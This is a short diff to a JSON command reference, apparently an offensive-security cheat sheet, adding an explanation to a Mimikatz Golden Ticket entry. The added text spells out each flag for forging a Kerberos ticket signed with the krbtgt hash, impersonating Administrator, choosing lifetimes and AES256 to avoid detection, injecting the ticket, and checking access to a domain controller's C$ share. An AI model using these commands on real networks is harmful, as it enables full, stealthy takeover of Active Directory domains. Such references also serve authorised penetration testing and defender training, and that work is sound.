@@ -103,5 +103,6 @@
       "label": "AES256 Golden Ticket (quieter alternative)",
       "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /ptt"
     }
-  ]
+  ],
+  "explain": "Forges a Golden Ticket with Mimikatz - a TGT signed by the krbtgt hash for arbitrary domain access:\n  kerberos::golden         forge the TGT offline\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /rc4:<krbtgt_ntlm>       the krbtgt hash used to sign (use /aes256 to be quieter)\n  /user:Administrator /id:500   impersonate Administrator (RID 500)\n  /renewmax:7 /endin:8     realistic lifetimes to blend in (vs the giveaway 10-year default)\n  /ptt                      inject into the session\nSigned with krbtgt, the KDC honors it everywhere; test with dir \\\\<dc>\\c$."
 }
